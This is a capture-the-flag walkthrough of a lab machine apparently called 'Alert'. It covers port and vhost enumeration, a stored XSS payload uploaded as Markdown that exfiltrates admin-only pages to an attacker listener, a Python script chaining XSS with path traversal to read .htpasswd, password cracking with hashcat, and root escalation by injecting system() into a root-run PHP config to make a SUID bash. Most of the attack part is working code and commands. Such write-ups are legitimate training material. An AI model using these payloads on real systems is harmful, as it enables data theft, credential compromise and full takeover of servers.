I started with  port enumeration.
```Terminal
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.11.44
```

- " -p- --open " : scans all ports and shows which ones are open
- " -sS " : SYN scan.
- " --min-rate 5000 " : specifies how many packets should be sent simultaneously.
- " -vvv " : increases the verbosity of the scan , displays more detailed information.

   To have a clear view of the SYN scan we add : 
- " -Pn " : disables ICMP Echo request.
- " -n " : disables DNS resolution

I found ports `22` and `80` open and enumerated them.

```Terminal
nmap -sC -sV -p22,80 10.10.11.44
```
- " -sC " : executes default scripts
- " -sV " : scans for service detection.

There I found that the domain name was `alert.htb`. Next I had to configure my `/etc/hosts` file.
```Terminal
sudo tee -a /etc/hosts > /dev/null <<EOT

## alert host
10.10.11.44 alert.htb
EOT
```

I also did vhost enumeration and found the `statistics.alert.htb` subdomain.

```Terminal
ffuf -w ~/Downloads/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10
```

I tried to connect there but I needed credentials. 

Back to our http server. 

There is an upload file directory, where I can upload only `.md` files. ![[Pasted image 20250523185001.png]]

I also found that at `About us` tab we get a message.

![[Pasted image 20250523190321.png]]

The administrator checks the contact messages at `Contact us`.

So step by step we check our tabs.
First we check the uploading tab `Markdown Viewer`.I sent a `.md` file that I created and I noticed something a little weird. After I was redirected, the contents of the file were displayed.

![[Pasted image 20250523190634.png]]

From this I understood that this was a `XSS` vulnerability.
```Script
<script>
{% raw %} /// DELETE THIS 
fetch('http://alert.htb/messages.php')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));
})
{% endraw %} /// DELETE THIS
</script>
```

- `fetch('http://alert.htb/messages.php')`  
    This line makes an HTTP GET request to `http://alert.htb/messages.php`.
    
    - It's attempting to retrieve the content of that page.
- `.then(resp => resp.text())`
    
    - It processes the response and converts it to plain text (`resp.text()`), instead of JSON or binary.
    - `body` will now contain the full HTML/text content returned by the page.
        
- `.then(body => { ... })`
    
    - In this block, it takes the text content (`body`) and does the following:
        
- `fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));`
    
    - It encodes the content using `btoa(body)` (Base64 encoding), so it can be safely included in a URL.
        
    - Then it sends this data to a remote server :
    - `http://10.10.14.22:9200/exfil?body=...`
        
    - This is the exfiltration part where it leaks the content of `messages.php` to our listener.

```redirect
http://alert.htb/visualizer.php
```

If we click `CTRL+U` to check the source-code we can see that the file was saved with a different name.
![[Pasted image 20250523185209.png]]

I started enumerating for directories and I found out about `messages.php` 
Once I search this `.php` file I can see that it is blank. But maybe for the administrator it is not. So I found a script and uploaded it to check the contents of `messages.php` as the administrator.

I found out that there is a vulnerability at `contact us` page, where I could write a `message` and recieve a response to my listening server. 

![[Pasted image 20250523190044.png]]

![[Pasted image 20250523190108.png]]

Combining all the above I upload the discussed script as `payload.md`, open a listener and copy-pasted the link I found at source code. 
`http://alert.htb/visualizer.php?link_share=6830997ae06754.83998933.md`
The admin will check the link and this will trigger the file which will send me the content of `messages.php` from the view of admin. 
![[Pasted image 20250523191831.png]]

Then I decrypt the Base64 encrypted message.

```Terminal
echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
```
So we can see that there is a `.txt` file there.

We can see that here is a `messages.php?file=...` parameter so we can try to check if there is a file inclusion vulnerability.
I found this python script.
```python
import requests
import re
import socket
import sys


if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} <target url>")
    sys.exit()
target = sys.argv[1] if sys.argv[1].startswith('http') else f'http://alert.htb/messages.php?file=../../../../{sys.argv[1]}'

# generate markdown
markdown = f"""### load script
<script>
fetch('{target}')
.then(resp => resp.text())
.then(body => {{fetch("http://10.10.14.22/exfil", {{ method: "POST", body: body}});}})
</script>
"""

# upload markdown
files = {"file": ("payload.md", markdown)}
resp = requests.post("http://alert.htb/visualizer.php", files=files)

# get share link
m = re.search(r"http://alert\.htb/visualizer\.php\?link_share=.*\.md", resp.text)
if not m:
    print("error: share link not in page")
    sys.exit()
share_link = m.group()

# send link to admin
data = {"email": "0xdf@alert.htb", "message": f"Check out this link: {share_link}"}
resp = requests.post("http://alert.htb/contact.php", data=data)

# get XSS resp
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 80))
    sock.listen(1)
    conn, addr = sock.accept()
    with conn:
        req = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            req += chunk

# print data
body = req.decode("utf-8").split("\r\n\r\n")[1]
print(body)
```
The second time that I tried to use this script it didn't work, so I did it manually. 
I searched for the hostname and then again I repeated what we did earlier.
```Script
<script>
fetch('http://alert.htb/messages.php?file=../../../etc/hostname')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));
})
</script>
```
There I found that there is a default configuration file for apache.
`/etc/apache2/sites-enabled/000-default.conf`.
There we can find some useful info.

![[Pasted image 20250523195535.png]]

If we read this file with the same way we can see the password for a user.
```Terminal
sudo python3 script.py /var/www/statistics.alert.htb/.htpasswd
```

```Terminal
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

```Terminal
hashcat albert.hash --user ~/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt 
```

```Credentials
albert:manchesterunited
```

We can now connect to port 22 via SSH  with these credentials and get the flag.

```user
5e08a222ac9809e502410937ed638862
```

---

Now we need to find a way for privesc. 

We can't run anything with `sudo`. If we use the `id` command we can see that we are part of the `management` group. If we search for a file that we have write permissions as `management` group we can find this `/opt/website-monitor/config/configuration.php`.

```
find / -group management 2>/dev/null
```

We can see that this file contains this : 
```configuration.php
<?php
define('PATH', '/opt/website-monitor');
?>
```

If we check `/opt/website-monitor/monitor.php` we can see that this script is running by root every minute and that `$PATH` is defined in the `configuration.php`. 
So what we have to do is to add some contents to the `configuration.php` and spawn a shell  with root privileges.

```configuration.php
<?php define('PATH', '/opt/website-monitor'); system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); ?>
```

This script allows a standard user to gain permanent, full root access.
- "define('PATH', '/opt/website-monitor');"
This line defines a constant named PATH.
- The `system` function in PHP tells the server to execute commands directly in the terminal.
   - "cp /bin/bash /tmp/damn"
   
   Copies the system's command shell (bash) to the /tmp folder and renames the copy to damn.
   - "chown root:root /tmp/damn"
   
   Attempts to change the owner of this new file to the root user.
   - "chmod 6777 /tmp/damn"
   
   It sets "special permissions" (the 6 at the start) and "universal permissions" (777).


So now we create a new directory and we create a SUID-root shell at `/tmp/damn`. 
To spawn a root shell now use the command :

```Terminal
/tmp/damn -p
```
![[Pasted image 20250525213818.png]]

Like this we move to root directory and read the flag.
```root
65383dc809d3cec5c567740343688722
```
